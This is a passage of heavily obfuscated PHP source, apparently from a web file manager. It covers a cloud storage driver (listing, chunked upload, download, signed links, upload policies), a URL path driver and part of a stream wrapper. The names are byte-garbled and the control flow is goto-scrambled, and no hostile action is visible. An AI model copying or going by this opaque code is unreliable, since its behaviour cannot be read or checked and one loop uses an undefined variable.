$d–÷í¾•‹Î), $eˆ òÆğ×ê[29] => $eˆ òÆğ×ê[76], $eˆ òÆğ×ê[187] => 0, $eˆ òÆğ×ê[107] => isset($d‹İö¸‰Œ[$eˆ òÆğ×ê[1246]]) ? $d‹İö¸‰Œ[$eˆ òÆğ×ê[1246]] : 0, $eˆ òÆğ×ê[1156] => !0, $eˆ òÆğ×ê[1157] => !0); if (empty($f©ô¨ÇÅ¡Œ)) { $f©ô¨ÇÅ¡Œ = $this->objectMeta($d–÷í¾•‹Î); if (!$f©ô¨ÇÅ¡Œ) { return $dãÑ×ÁÎÔ; } $dãÑ×ÁÎÔ[$eˆ òÆğ×ê[187]] = $f©ô¨ÇÅ¡Œ[$eˆ òÆğ×ê[1247]]; $dãÑ×ÁÎÔ[$eˆ òÆğ×ê[107]] = $f©ô¨ÇÅ¡Œ[$eˆ òÆğ×ê[1248]]; } return $dãÑ×ÁÎÔ; } private function fileList($F·Æ’®ˆÒ, $Aéî…»¡Ø = 0, $bÓ‚ÂÄØ—Í = 1000) { $F‚‚ÛŸ³£ƒ =& $_SERVER[îÖ]; $bÂŠÇ“ŠÑƒ = array($F‚‚ÛŸ³£ƒ[1249], $F‚‚ÛŸ³£ƒ[1250] . $bÓ‚ÂÄØ—Í); if ($Aéî…»¡Ø) { $bÂŠÇ“ŠÑƒ[] = $F‚‚ÛŸ³£ƒ[1251] . $Aéî…»¡Ø; } $aù…™àÇŠ = $this->ussRequest($F·Æ’®ˆÒ, $F‚‚ÛŸ³£ƒ[216], !1, $bÂŠÇ“ŠÑƒ); return !$aù…™àÇŠ[$F‚‚ÛŸ³£ƒ[1026]] ? !1 : $aù…™àÇŠ[$F‚‚ÛŸ³£ƒ[1028]]; } public function listPath($B«‚Šµ·öØ, $aö®ê«ÈÇ = false) { goto DˆÅ¦Ÿ„Á; DˆÅ¦Ÿ„Á: $dÔ¤÷éŒ‚Ø =& $_SERVER[îÖ]; $cÁïÏÂ±Áó = $dÔ¤÷éŒ‚Ø[33]; $Bå‹¦•ó = 1000; goto Fç¥Ó‹†»ƒ; d‚°‰ğ·Üë: return array($dÔ¤÷éŒ‚Ø[74] => $D™æ‰£¹ªí, $dÔ¤÷éŒ‚Ø[73] => $BºãÉÍÑÆñ); goto D§ÆÚ’ğ¼¤; Fç¥Ó‹†»ƒ: $D™æ‰£¹ªí = $BºãÉÍÑÆñ = array(); $Dµ¸®šÒé™ = rtrim($B«‚Šµ·öØ, $dÔ¤÷éŒ‚Ø[8]) . $dÔ¤÷éŒ‚Ø[8]; while (!0) { $a¡ƒÚ÷…¨Ñ = $this->fileList($B«‚Šµ·öØ, $cÁïÏÂ±Áó, $Bå‹¦•ó); if (!$a¡ƒÚ÷…¨Ñ) { return !1; } $cÁïÏÂ±Áó = isset($a¡ƒÚ÷…¨Ñ[$dÔ¤÷éŒ‚Ø[1252]]) ? $a¡ƒÚ÷…¨Ñ[$dÔ¤÷éŒ‚Ø[1252]] : $dÔ¤÷éŒ‚Ø[33]; $B°‰ß‡Ş¬ö = isset($a¡ƒÚ÷…¨Ñ[$dÔ¤÷éŒ‚Ø[1253]]) ? $a¡ƒÚ÷…¨Ñ[$dÔ¤÷éŒ‚Ø[1253]] : array(); foreach ($B°‰ß‡Ş¬ö as $d¨ãƒÇ‘½â) { if ($d¨ãƒÇ‘½â[$dÔ¤÷éŒ‚Ø[29]] == $dÔ¤÷éŒ‚Ø[76]) { $D™æ‰£¹ªí[] = $this->folderInfo($Dµ¸®šÒé™ . $d¨ãƒÇ‘½â[$dÔ¤÷éŒ‚Ø[28]], $aö®ê«ÈÇ, $d¨ãƒÇ‘½â); } else { $BºãÉÍÑÆñ[] = $this->fileInfo($Dµ¸®šÒé™ . $d¨ãƒÇ‘½â[$dÔ¤÷éŒ‚Ø[28]], $aö®ê«ÈÇ, $d¨ãƒÇ‘½â); } } if (count($B°‰ß‡Ş¬ö) < $Bå‹¦•ó) { break; } } goto d‚°‰ğ·Üë; D§ÆÚ’ğ¼¤: } private function recursionAllFiles($ašé™È§³à, &$a°¡©Ñ¶š¸) { $a…¯¦µÈÛ =& $_SERVER[îÖ]; $e¤À½Ì§´Ø = $a…¯¦µÈÛ[33]; $b‰‚ÂÖì·Å = 1000; $dõ‘–ƒ¤ã = $e¤ßÔƒ¼ˆ = array(); $fÀöŠ„ïê = rtrim($ašé™È§³à, $a…¯¦µÈÛ[8]) . $a…¯¦µÈÛ[8]; while (!0) { $BæÛÑ¨Ò” = $this->fileList($ašé™È§³à, $e¤À½Ì§´Ø, $b‰‚ÂÖì·Å); if (!$BæÛÑ¨Ò”) { return !1; } $e¤À½Ì§´Ø = isset($BæÛÑ¨Ò”[$a…¯¦µÈÛ[1252]]) ? $BæÛÑ¨Ò”[$a…¯¦µÈÛ[1252]] : $a…¯¦µÈÛ[33]; $f´ºô½¬åÎ = isset($BæÛÑ¨Ò”[$a…¯¦µÈÛ[1253]]) ? $BæÛÑ¨Ò”[$a…¯¦µÈÛ[1253]] : array(); foreach ($f´ºô½¬åÎ as $dø®ï‰Ä­ƒ) { $aöê¤±‘Íğ = array($a…¯¦µÈÛ[75] => $fÀöŠ„ïê . $dø®ï‰Ä­ƒ[$a…¯¦µÈÛ[28]], $a…¯¦µÈÛ[76] => $dø®ï‰Ä­ƒ[$a…¯¦µÈÛ[29]] == $a…¯¦µÈÛ[76] ? 1 : 0, $a…¯¦µÈÛ[77] => isset($dø®ï‰Ä­ƒ[$a…¯¦µÈÛ[325]]) ? $dø®ï‰Ä­ƒ[$a…¯¦µÈÛ[325]] : 0); $a°¡©Ñ¶š¸[] = $aöê¤±‘Íğ; if ($aöê¤±‘Íğ[$a…¯¦µÈÛ[76]] == 1) { $this->recursionAllFiles($aöê¤±‘Íğ[$a…¯¦µÈÛ[75]], $a°¡©Ñ¶š¸); } } if (count($f´ºô½¬åÎ) < $b‰‚ÂÖì·Å) { break; } } } public function has($B…Ï„ï®Ö›, $a»—‡Ó¦Ğà = false, $f„¸½²Åê = true) { goto BøÔõëÏ­; BøÔõëÏ­: $aÙéĞ÷Š²à =& $_SERVER[îÖ]; $fÍ«ƒé¨ê = $aÙéĞ÷Š²à[33]; $EŞö“»ğ¹ = 1000; goto fŸØ¤®µ¥ˆ; fŸØ¤®µ¥ˆ: $f§ÕÛ¥¤ = 0; $Dµ˜¥ªĞÉ¤ = 0; $a®êŞÂ®ÂÑ = rtrim($B…Ï„ï®Ö›, $aÙéĞ÷Š²à[8]) . $aÙéĞ÷Š²à[8]; goto e°ÈÕ²âÖÆ; e°ÈÕ²âÖÆ: while (!0) { $A‰ëòœ¥¶‰ = $this->fileList($B…Ï„ï®Ö›, $fÍ«ƒé¨ê, $EŞö“»ğ¹); if (!$A‰ëòœ¥¶‰) { return !1; } $fÍ«ƒé¨ê = isset($A‰ëòœ¥¶‰[$aÙéĞ÷Š²à[1252]]) ? $A‰ëòœ¥¶‰[$aÙéĞ÷Š²à[1252]] : $aÙéĞ÷Š²à[33]; $cÎ“¡¥Úãé = isset($A‰ëòœ¥¶‰[$aÙéĞ÷Š²à[1253]]) ? $A‰ëòœ¥¶‰[$aÙéĞ÷Š²à[1253]] : array(); if (empty($cÎ“¡¥Úãé)) { break; } $e…•õËˆ¿³ = array_to_keyvalue($cÎ“¡¥Úãé, $aÙéĞ÷Š²à[33], $aÙéĞ÷Š²à[29]); $cÃÃÆÑö·¤ = array_count_values($e…•õËˆ¿³); $b§ÁÉøî– = isset($cÃÃÆÑö·¤[$aÙéĞ÷Š²à[76]]) ? $cÃÃÆÑö·¤[$aÙéĞ÷Š²à[76]] : 0; $F·öˆ£ŠÂò = count($e…•õËˆ¿³) - $b§ÁÉøî–; if ($a»—‡Ó¦Ğà) { $Dµ˜¥ªĞÉ¤ += $b§ÁÉøî–; $f§ÕÛ¥¤ += $F·öˆ£ŠÂò; if ($då²ñ£•¶Â < $EŞö“»ğ¹) { break; } continue; } if ($f„¸½²Åê) { if ($F·öˆ£ŠÂò) { return !0; } } else { if ($b§ÁÉøî–) { return !0; } } if (count($cÎ“¡¥Úãé) < $EŞö“»ğ¹) { break; } } if ($a»—‡Ó¦Ğà) { return array($aÙéĞ÷Š²à[191] => $f§ÕÛ¥¤, $aÙéĞ÷Š²à[192] => $Dµ˜¥ªĞÉ¤); } return !1; goto c…‘íƒ„‹¥; c…‘íƒ„‹¥: } public function listAll($eëÑŞšåã”) { $bİôñÌ¢–º = array(); $this->recursionAllFiles($eëÑŞšåã”, $bİôñÌ¢–º); return $bİôñÌ¢–º; } public function canRead($Fàà•ªŠ™) { return $this->exist($Fàà•ªŠ™) ? !0 : !1; } public function canWrite($AÅÂãÑíò¥) { return $this->exist($AÅÂãÑíò¥) ? !0 : !1; } public function getContent($dõƒ¢Â°—) { return $this->fileSubstr($dõƒ¢Â°—, 0, -1); } public function setContent($EçÒ”‘¦¤½, $Dáø©½Ä‚ì = '') { $eÔ†²æ·Ü =& $_SERVER[îÖ]; if (!$Dáø©½Ä‚ì) { $b³’æ¬ÒêË = $this->ussRequest($EçÒ”‘¦¤½, $eÔ†²æ·Ü[212]); return $b³’æ¬ÒêË[$eÔ†²æ·Ü[1026]]; } $EÕçä¿ÑÙİ = $this->tempFile($this->pathThis($EçÒ”‘¦¤½)); file_put_contents($EÕçä¿ÑÙİ, $Dáø©½Ä‚ì); if ($this->upload($EçÒ”‘¦¤½, $EÕçä¿ÑÙİ)) { $this->tempFileRemve($EÕçä¿ÑÙİ); return !0; } return !1; } public function fileSubstr($E§ìâÜŞ”, $fÃÖ©ÜÌé‘, $f‚ùÍĞš¥) { $FÓÕÂƒÂ× =& $_SERVER[îÖ]; if (!($DĞİ–·ê = $this->link($E§ìâÜŞ”))) { return !1; } $d£§…³‘ = !1; if ($f‚ùÍĞš¥ > 0) { $B“›ÀßÜ³î = $fÃÖ©ÜÌé‘ + $f‚ùÍĞš¥ - 1; $d£§…³‘ = array($FÓÕÂƒÂ×[1214] . $fÃÖ©ÜÌé‘ . $FÓÕÂƒÂ×[412] . $B“›ÀßÜ³î); } $F¦âŸæ‘”Å = url_request($DĞİ–·ê, $FÓÕÂƒÂ×[216], !1, $d£§…³‘); return $F¦âŸæ‘”Å[$FÓÕÂƒÂ×[688]] ? $F¦âŸæ‘”Å[$FÓÕÂƒÂ×[1028]] : !1; } public function upload($Eˆ®İãô, $bÕêÁ ©­, $bÕÏèÖ–°¹ = false, $E·ìİ„Œ¦Ä = REPEAT_REPLACE) { goto e……Ç„¤Ê¼; e‹‚Ì–¦Ê: $Fµ¼Ø¿¨µ = $this->ussRequest($Eˆ®İãô, $FìÂÒêÒë«[214], !1, $Cì…òË´«¨); return $Fµ¼Ø¿¨µ[$FìÂÒêÒë«[1026]] ? $this->getPathOuter($bÓ£Ï–±ã™) : !1; goto b¬Í¡Ğ’À; F™ñ¡…·©³: $C•²Ï±‰Çä = $aø–—ò‘Åğ[$FìÂÒêÒë«[1259]]; $BäÔì¨ì˜Ö = fopen($bÕêÁ ©­, $FìÂÒêÒë«[1164]); if (!$BäÔì¨ì˜Ö) { return !1; } goto dÇ„â†‡Ï·; fÇ©‰âÛ—š: $d¤–ù˜¦ƒß = 1024 * 1024 * 10; $Cì…òË´«¨ = array($FìÂÒêÒë«[1255], $FìÂÒêÒë«[1256] . $D¯ÊÂ˜½Óò, $FìÂÒêÒë«[1257], $FìÂÒêÒë«[1258] . $d¤–ù˜¦ƒß); $Fµ¼Ø¿¨µ = $this->ussRequest($Eˆ®İãô, $FìÂÒêÒë«[214], !1, $Cì…òË´«¨); goto e ÉòÍùÚ; e……Ç„¤Ê¼: $FìÂÒêÒë« =& $_SERVER[îÖ]; $D¯ÊÂ˜½Óò = IO::size($bÕêÁ ©­); if ($D¯ÊÂ˜½Óò <= 1024 * 1024 * 200) { $F‘¯Å¯¹Ôº = array($FìÂÒêÒë«[1254] . $bÕêÁ ©­); $Fµ¼Ø¿¨µ = $this->ussRequest($Eˆ®İãô, $FìÂÒêÒë«[214], $F‘¯Å¯¹Ôº); return $Fµ¼Ø¿¨µ[$FìÂÒêÒë«[1026]] ? $this->getPathOuter($Eˆ®İãô) : !1; } goto fÇ©‰âÛ—š; dÇ„â†‡Ï·: do { $D¤¬èå«œ = $aø–—ò‘Åğ[$FìÂÒêÒë«[1260]]; fseek($BäÔì¨ì˜Ö, $f é­ñ¼Î×); $Eƒñ­Ò‚ = fread($BäÔì¨ì˜Ö, $D¤¬èå«œ); $f¢¥¼¦¨Ä = 0; do { $f¢¥¼¦¨Ä++; $aø–—ò‘Åğ = $this->uploadPart($Eˆ®İãô, $aø–—ò‘Åğ, $Eƒñ­Ò‚); } while (!$aø–—ò‘Åğ && $f¢¥¼¦¨Ä < 3); if (!$aø–—ò‘Åğ) { return !1; } $C•²Ï±‰Çä = $aø–—ò‘Åğ[$FìÂÒêÒë«[1259]]; $f é­ñ¼Î× += $D¤¬èå«œ; } while ($C•²Ï±‰Çä != -1); fclose($BäÔì¨ì˜Ö); $Cì…òË´«¨ = array($FìÂÒêÒë«[1261], $FìÂÒêÒë«[1262] . $aø–—ò‘Åğ[$FìÂÒêÒë«[1263]], $FìÂÒêÒë«[1257]); goto e‹‚Ì–¦Ê; e ÉòÍùÚ: if (!$Fµ¼Ø¿¨µ[$FìÂÒêÒë«[1026]]) { return !1; } $aø–—ò‘Åğ = $Fµ¼Ø¿¨µ[$FìÂÒêÒë«[1028]]; $f é­ñ¼Î× = 0; goto F™ñ¡…·©³; b¬Í¡Ğ’À: } private function uploadPart($dº¨¼ìÜŒğ, $eŞ‚ŠîºÖÈ, &$A¦ÇÃ­‡Ò) { $B…ßÏ°ï¼‘ =& $_SERVER[îÖ]; $bºİøï‚¸ = array($B…ßÏ°ï¼‘[1264], $B…ßÏ°ï¼‘[1262] . $eŞ‚ŠîºÖÈ[$B…ßÏ°ï¼‘[1263]], $B…ßÏ°ï¼‘[1265] . $eŞ‚ŠîºÖÈ[$B…ßÏ°ï¼‘[1259]], $B…ßÏ°ï¼‘[138] . $eŞ‚ŠîºÖÈ[$B…ßÏ°ï¼‘[1260]]); $eà©§¬£¼å = $this->ussRequest($dº¨¼ìÜŒğ, $B…ßÏ°ï¼‘[214], $A¦ÇÃ­‡Ò, $bºİøï‚¸); return !$eà©§¬£¼å[$B…ßÏ°ï¼‘[1026]] ? $eà©§¬£¼å[$B…ßÏ°ï¼‘[1026]] : $eà©§¬£¼å[$B…ßÏ°ï¼‘[1028]]; } public function uploadFormData($d§ÑæŒ¦¼Ö, $FìˆåæÁ»å = 3600) { return $this->uploadPolicy($d§ÑæŒ¦¼Ö, $FìˆåæÁ»å); } public function multiUploadFormData($Eœ» ´àêË, $B‰Ìº¶ÆÃ = 3600) { $dä„ç’®” =& $_SERVER[îÖ]; $a‡ªëšñÒ = (int) $GLOBALS[$dä„ç’®”[7]][$dä„ç’®”[77]]; return $this->uploadPolicy($Eœ» ´àêË, $B‰Ìº¶ÆÃ, $a‡ªëšñÒ); } private function uploadPolicy($e´¢ÈÄÀÆ, $C“£ÜØ™Ï¦ = 3600, $c¦µÉ‚÷ğ¹ = 0) { goto F…–±òŒ†é; fÆï…©œ¡: $d©ôôì‚‡ = base64_encode(hash_hmac($B‘×ø“ëÚ[1236], "\120\117\123\124\46{$aª¦áø»Ãœ}\x26{$E‡ÀÀğóÒÒ}\x26{$d¶ëë°»Ö}", md5("{$this->userpass}"), !0)); $f‘³˜Ã­Ô = array($B‘×ø“ëÚ[1106] => $d¶ëë°»Ö, $B‘×ø“ëÚ[1270] => "\125\120\x59\x55\x4e\40{$this->username}\x3a{$d©ôôì‚‡}", $B‘×ø“ëÚ[169] => $this->endpoint . $aª¦áø»Ãœ); return $f‘³˜Ã­Ô; goto A²‘¡Üã§§; F…–±òŒ†é: $B‘×ø“ëÚ =& $_SERVER[îÖ]; $aª¦áø»Ãœ = $B‘×ø“ëÚ[8] . $this->bucket; $E‡ÀÀğóÒÒ = gmdate($B‘×ø“ëÚ[1199]); goto A¸²›¥¸Õò; A¸²›¥¸Õò: $aÕöŠÕ¿¸´ = array($B‘×ø“ëÚ[1266] => $this->bucket, $B‘×ø“ëÚ[1267] => $e´¢ÈÄÀÆ, $B‘×ø“ëÚ[1268] => time() + $C“£ÜØ™Ï¦, $B‘×ø“ëÚ[1269] => $E‡ÀÀğóÒÒ); if ($c¦µÉ‚÷ğ¹) { $aÕöŠÕ¿¸´[$B‘×ø“ëÚ[1185]] = $c¦µÉ‚÷ğ¹; } $d¶ëë°»Ö = base64_encode(json_encode($aÕöŠÕ¿¸´)); goto fÆï…©œ¡; A²‘¡Üã§§: } public function download($E—×Õ¦Ô¬‰, $DâŠ­˜Ş± ) { goto cœãÒ×çè¨; d¤×¼Â‚‡: fclose($AÆìÁÎ‹Ä); return $DâŠ­˜Ş± ; goto CÈ‡‚ Ä®¥; cÅá†µ¼†Ç: $e„ï¡×’éÛ = 1024 * 200; $AÆìÁÎ‹Ä = fopen($D±¥§Ó¨‡, $_SERVER[îÖ][1220]); while (!0) { $aÈä°ğËÃ = $this->fileSubstr($E—×Õ¦Ô¬‰, $F¾µáİ­„Š, $e„ï¡×’éÛ); if ($aÈä°ğËÃ === !1) { return !1; } fwrite($AÆìÁÎ‹Ä, $aÈä°ğËÃ); $F¾µáİ­„Š += $e„ï¡×’éÛ; if (strlen($aÈä°ğËÃ) < $e„ï¡×’éÛ) { break; } } goto d¤×¼Â‚‡; cœãÒ×çè¨: $D±¥§Ó¨‡ = IO::getPathInner(IO::mkfile($DâŠ­˜Ş± )); if (!($F‹¡†æ‚ = $this->link($E—×Õ¦Ô¬‰))) { return !1; } $F¾µáİ­„Š = 0; goto cÅá†µ¼†Ç; CÈ‡‚ Ä®¥: } public function link($B„ÊÑ±²—í, $c¤‡ëÌÏà = array()) { $D³¢†íÀ­ê =& $_SERVER[îÖ]; $B„ÊÑ±²—í = trim($B„ÊÑ±²—í, $D³¢†íÀ­ê[8]); if (!empty($this->token)) { $AÃ¨»°è = strtotime(date($D³¢†íÀ­ê[1271])); $c„Û¡òßÃğ = substr(md5($this->token . $D³¢†íÀ­ê[272] . $AÃ¨»°è . $D³¢†íÀ­ê[1272] . $B„ÊÑ±²—í), 12, 8) . $AÃ¨»°è; $c¤‡ëÌÏà[] = $D³¢†íÀ­ê[1273] . $c„Û¡òßÃğ; } $bÔ—Ùš¤Å” = !empty($c¤‡ëÌÏà) ? $D³¢†íÀ­ê[69] . implode($D³¢†íÀ­ê[272], $c¤‡ëÌÏà) : $D³¢†íÀ­ê[33]; return $this->getHost() . $D³¢†íÀ­ê[8] . $B„ÊÑ±²—í . $bÔ—Ùš¤Å”; } public function fileOut($fÑåÁĞ»õ, $b‚ÏœœÎªÕ = false, $a„ôößíğá = false, $B„¿¢ó«» = '') { if (!$a„ôößíğá) { $a„ôößíğá = $this->pathThis($fÑåÁĞ»õ); } $AÛ”Ä¸•¶¼ = $b‚ÏœœÎªÕ ? array($_SERVER[îÖ][1274] . rawurlencode($a„ôößíğá)) : array(); $D«¸÷ª¤Š = $this->link($fÑåÁĞ»õ, $AÛ”Ä¸•¶¼); $this->fileOutLink($D«¸÷ª¤Š); } public function fileOutServer($Aƒ…–¢½º, $AÒòÛİ³ = false, $eŠÍ¢Ù‹½ = false, $eÒÍ¼ÅŸ¤ = '') { parent::fileOut($Aƒ…–¢½º, $AÒòÛİ³, $eŠÍ¢Ù‹½, $eÒÍ¼ÅŸ¤); } public function fileOutImage($c‘ŒÑ‚ó®–, $Dİ¢†®‡¯Ï = 250) { $CŒ¥«¸¥‡ = $this->link($c‘ŒÑ‚ó®– . $_SERVER[îÖ][1275] . $Dİ¢†®‡¯Ï); $this->fileOutLink($CŒ¥«¸¥‡); } public function fileOutImageServer($F›ğ—Ş§÷, $bóï¸ôå˜‹ = 250) { parent::fileOutImage($F›ğ—Ş§÷, $bóï¸ôå˜‹); } public function hashMd5($DÓ±…éÌè„) { $eÖ‚øÒˆ™ =& $_SERVER[îÖ]; $C•®“İ†­ = $this->objectMeta($DÓ±…éÌè„); return isset($C•®“İ†­[$eÖ‚øÒˆ™[196]]) ? $C•®“İ†­[$eÖ‚øÒˆ™[196]] : !1; } public function size($C•ŒˆÅ¡«ƒ) { $a½‡‹¼Š = $this->objectMeta($C•ŒˆÅ¡«ƒ); return $a½‡‹¼Š ? $a½‡‹¼Š[$_SERVER[îÖ][77]] : 0; } public function info($bºÁºÎ”Œ¸) { if ($this->isFolder($bºÁºÎ”Œ¸)) { return $this->folderInfo($bºÁºÎ”Œ¸); } else { if ($this->isFile($bºÁºÎ”Œ¸)) { return $this->fileInfo($bºÁºÎ”Œ¸); } } return !1; } public function exist($cØß±¶ÉğÚ) { return $this->isFile($cØß±¶ÉğÚ) || $this->isFolder($cØß±¶ÉğÚ); } public function isFile($fÂíÜ´´µŞ) { return !$this->isFolder($fÂíÜ´´µŞ) && $this->objectMeta($fÂíÜ´´µŞ); } public function isFolder($CŸªª——œİ) { return $this->cacheMethod($_SERVER[îÖ][223], $CŸªª——œİ); } protected function objectMeta($FŒôÀÑŒ) { return $this->cacheMethod($_SERVER[îÖ][224], $FŒôÀÑŒ); } protected function _objectMeta($Dñ‘®ŸøíÑ) { goto E—ŒòòÙ£; aèí’™³ó‰: if (!$B×£ÆìËë¹[$BÕõòÌí[1026]]) { return null; } $cÒªŞÕ·èĞ = isset($B×£ÆìËë¹[$BÕõòÌí[1028]]) ? $B×£ÆìËë¹[$BÕõòÌí[1028]] : array(); if (!isset($cÒªŞÕ·èĞ[$BÕõòÌí[1277]])) { return null; } goto e‹ƒ‹Ô¼Øê; e‹ƒ‹Ô¼Øê: $CÎ§šÙ‹×Ö = array($BÕõòÌí[28] => get_path_this($Dñ‘®ŸøíÑ), $BÕõòÌí[29] => isset($cÒªŞÕ·èĞ[$BÕõòÌí[1277]]) ? $cÒªŞÕ·èĞ[$BÕõòÌí[1277]] : null, $BÕõòÌí[77] => isset($cÒªŞÕ·èĞ[$BÕõòÌí[1278]]) ? $cÒªŞÕ·èĞ[$BÕõòÌí[1278]] : null, $BÕõòÌí[196] => isset($cÒªŞÕ·èĞ[$BÕõòÌí[1279]]) ? $cÒªŞÕ·èĞ[$BÕõòÌí[1279]] : null, $BÕõòÌí[1247] => isset($cÒªŞÕ·èĞ[$BÕõòÌí[1280]]) ? $cÒªŞÕ·èĞ[$BÕõòÌí[1280]] : null); $CÎ§šÙ‹×Ö[$BÕõòÌí[1248]] = isset($cÒªŞÕ·èĞ[$BÕõòÌí[1281]]) ? strtotime($cÒªŞÕ·èĞ[$BÕõòÌí[1281]]) : $CÎ§šÙ‹×Ö[$BÕõòÌí[1247]]; return $CÎ§šÙ‹×Ö; goto FÙ‹ÉÆ§é; E—ŒòòÙ£: $BÕõòÌí =& $_SERVER[îÖ]; if ($Dñ‘®ŸøíÑ == $BÕõòÌí[33] || $Dñ‘®ŸøíÑ == $BÕõòÌí[8]) { return array(); } $B×£ÆìËë¹ = $this->ussRequest($Dñ‘®ŸøíÑ, $BÕõòÌí[1276]); goto aèí’™³ó‰; FÙ‹ÉÆ§é: } protected function _isFolder($f”÷ÀŒÉ) { $Cœ¨¼ÓÀÊŸ =& $_SERVER[îÖ]; if ($f”÷ÀŒÉ == $Cœ¨¼ÓÀÊŸ[33] || $f”÷ÀŒÉ == $Cœ¨¼ÓÀÊŸ[8]) { return !0; } $F…‘ˆİ•É‘ = $this->objectMeta($f”÷ÀŒÉ); return isset($F…‘ˆİ•É‘[$Cœ¨¼ÓÀÊŸ[29]]) && $F…‘ˆİ•É‘[$Cœ¨¼ÓÀÊŸ[29]] == $Cœ¨¼ÓÀÊŸ[76] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($B×˜££ì³• = false) { } public function exist($dê¿™ÍêÜİ) { $D÷ÈÓŒåó = $this->info($dê¿™ÍêÜİ); return $D÷ÈÓŒåó[$_SERVER[îÖ][188]]; } public function isFile($c«ï¡²Ä•·) { $EÎ”Ï®·â = $this->info($c«ï¡²Ä•·); return $EÎ”Ï®·â[$_SERVER[îÖ][188]]; } public function isFolder($e’ù™ÔñÑ) { return !1; } public function size($b“ˆçÈ å¾) { $cñƒÌ‘‡³Ä = $this->info($b“ˆçÈ å¾); return $cñƒÌ‘‡³Ä[$_SERVER[îÖ][77]]; } public function info($E”ØÚ×øñ´) { return $this->infoParse($E”ØÚ×øñ´); } public function infoAuth($Eô êÒ‘) { return $this->infoParse($Eô êÒ‘); } public function infoWithChildren($Fø•ñ‹½Øì) { return $this->infoParse($Fø•ñ‹½Øì); } public function infoFull($b”’àµ—ŸÌ) { return $this->infoParse($b”’àµ—ŸÌ); } private function infoParse($F§—ôŸ¹°) { $E®ªé«•ğ– =& $_SERVER[îÖ]; $Aƒ¸œŠğ‘… = $this->header($F§—ôŸ¹°); if (!$Aƒ¸œŠğ‘… || !$Aƒ¸œŠğ‘…[$E®ªé«•ğ–[688]]) { return !1; } $eÄÑœãæŠÒ = _get($Aƒ¸œŠğ‘…, $E®ªé«•ğ–[325], 0); $AµÄ¶¼âŒ = array($E®ªé«•ğ–[28] => $Aƒ¸œŠğ‘…[$E®ªé«•ğ–[28]], $E®ªé«•ğ–[75] => $F§—ôŸ¹°, $E®ªé«•ğ–[29] => $E®ªé«•ğ–[167], $E®ªé«•ğ–[77] => intval($eÄÑœãæŠÒ), $E®ªé«•ğ–[160] => get_path_ext($Aƒ¸œŠğ‘…[$E®ªé«•ğ–[28]]), $E®ªé«•ğ–[1156] => $eÄÑœãæŠÒ > 0 && $Aƒ¸œŠğ‘…[$E®ªé«•ğ–[1282]], $E®ªé«•ğ–[1157] => !1); return $AµÄ¶¼âŒ; } private function header($A–É—Îõˆ„) { if (isset(self::$_cacheHeader[$A–É—Îõˆ„])) { return self::$_cacheHeader[$A–É—Îõˆ„]; } self::$_cacheHeader[$A–É—Îõˆ„] = url_header($A–É—Îõˆ„); return self::$_cacheHeader[$A–É—Îõˆ„]; } public function hashSimple($bç‡©À“µß, $bøå†£²ù¥ = false) { goto a¬òöÎ·õ²; BŸ–Œ¯é‘: $cáÚéòŒáÜ .= $this->fileSubstr($bç‡©À“µß, $Cø¶àŠ - $DéÒ¶Ğé·, $DéÒ¶Ğé·); return md5($cáÚéòŒáÜ) . $Cø¶àŠ; goto f—µ‹¥ ±ë; EŸù—¤¼æ¿: if ($Cø¶àŠ <= $DéÒ¶Ğé· * $a»Ÿ«¤—Ç) { return md5($this->fileSubstr($bç‡©À“µß, 0, $Cø¶àŠ)) . $Cø¶àŠ; } $Bøêœ÷®Íù = intval($Cø¶àŠ / $a»Ÿ«¤—Ç); $cáÚéòŒáÜ = $DÕìÏîØ§Æ[33]; goto C²ÒÃÜâá; BÕ¿ÏˆˆÂë: $Cø¶àŠ = $cœÌ¢°è¹[$DÕìÏîØ§Æ[77]]; $DéÒ¶Ğé· = 200; $a»Ÿ«¤—Ç = 50; goto EŸù—¤¼æ¿; a¬òöÎ·õ²: $DÕìÏîØ§Æ =& $_SERVER[îÖ]; $cœÌ¢°è¹ = $this->info($bç‡©À“µß); if (!$cœÌ¢°è¹ || !$cœÌ¢°è¹[$DÕìÏîØ§Æ[188]]) { return !1; } goto BÕ¿ÏˆˆÂë; C²ÒÃÜâá: $bß™ˆèèª = timeFloat(); $dš’Ç…ù“ = 15; for ($aøÉğ½À×ã = 0; $aøÉğ½À×ã < $a»Ÿ«¤—Ç; $aøÉğ½À×ã++) { if (timeFloat() - $bß™ˆèèª > $dš’Ç…ù“) { return !1; } $eÎøÕ²¾”ª = $this->fileSubstr($bç‡©À“µß, $Bøêœ÷®Íù * $aøÉğ½À×ã, $DéÒ¶Ğé·); if (!$eÎøÕ²¾”ª) { return !1; } $cáÚéòŒáÜ .= $eÎøÕ²¾”ª; } goto BŸ–Œ¯é‘; f—µ‹¥ ±ë: } public function getContent($C÷ìÏ‘ğƒ) { return $this->fileSubstr($C÷ìÏ‘ğƒ); } public function fileSubstr($dÆÙõöŸœî, $F´‚‡£ë = 0, $Dä’¬ÅÔÂ– = -1) { goto F·ÎÈ‚ˆíƒ; eƒáÏ™Ò‡ö: $C“Äí—‚ÜÑ = url_request($dÆÙõöŸœî, $E¨©Ğªë”[216], !1, $D’¾ œÎØ, !1, !1, 1); return $C“Äí—‚ÜÑ[$E¨©Ğªë”[1028]] ? $C“Äí—‚ÜÑ[$E¨©Ğªë”[1028]] : $E¨©Ğªë”[33]; goto Cº™É…¼é“; EÖ“êÉĞ: if ($Dä’¬ÅÔÂ– === -1) { $Dä’¬ÅÔÂ– = $d©ÊßßŞ„¤[$E¨©Ğªë”[77]]; } if ($Dä’¬ÅÔÂ– == 0) { return $E¨©Ğªë”[33]; } $D’¾ œÎØ = array($E¨©Ğªë”[1283] . $F´‚‡£ë . $E¨©Ğªë”[715] . ($F´‚‡£ë + $Dä’¬ÅÔÂ– - 1)); goto eƒáÏ™Ò‡ö; F·ÎÈ‚ˆíƒ: $E¨©Ğªë” =& $_SERVER[îÖ]; $d©ÊßßŞ„¤ = $this->info($dÆÙõöŸœî); if (!$d©ÊßßŞ„¤ || !$d©ÊßßŞ„¤[$E¨©Ğªë”[188]] && $d©ÊßßŞ„¤[$E¨©Ğªë”[77]] > 1024 * 1024 * 10) { return !1; } goto EÖ“êÉĞ; Cº™É…¼é“: } public function download($cØ³Çô¹–‰, $d—ÀòåĞ) { Downloader::start($cØ³Çô¹–‰, $d—ÀòåĞ); return $d—ÀòåĞ; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($eÊÍ ê¾, $B”‘Û„±¸´ = '') { goto A³›µ’‹Úæ; f–Œîëñƒ: return $this->info ? !0 : !1; 